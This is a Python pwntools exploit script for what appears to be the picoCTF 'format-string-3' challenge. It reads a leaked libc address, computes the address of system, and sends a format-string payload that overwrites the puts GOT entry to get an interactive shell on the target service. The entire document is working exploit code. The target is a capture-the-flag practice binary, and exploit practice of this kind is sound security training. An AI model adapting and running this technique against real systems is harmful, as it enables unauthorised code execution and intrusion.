import os, sys
from pwn import *

# $ socat tcp-listen:4000,reuseaddr,fork, EXEC:"./format-string-3"
# $ python tmp.py

context.bits = 64

adrs = '127.0.0.1'
#adrs = 'rhea.picoctf.net'
port = 4000
#port = 65028

setbuf_raddr = 0x7a3f0
system_raddr = 0x4f760
puts_got = 0x404018

proc = remote( adrs, port )

print( proc.recvline() ) # Howdy gamers!
ret = proc.recvline()    # Okay I'll be nice. Here's the address of setvbuf in libc:
print( ret )

ret = ret.decode( 'utf-8' )

assert "setvbuf" in ret, f"ret={ret}"

idx = ret.index("libc")
setbuf_aaddr = int( ret[idx + 6:], base=16 )
print( f"setbuf_aaddr={setbuf_aaddr}" )

libc_base    = setbuf_aaddr - setbuf_raddr
system_aaddr = libc_base + system_raddr

payload = fmtstr_payload( offset=38, writes={puts_got: system_aaddr}, numbwritten=0, write_size="short" )

proc.send( payload )

proc.interactive()
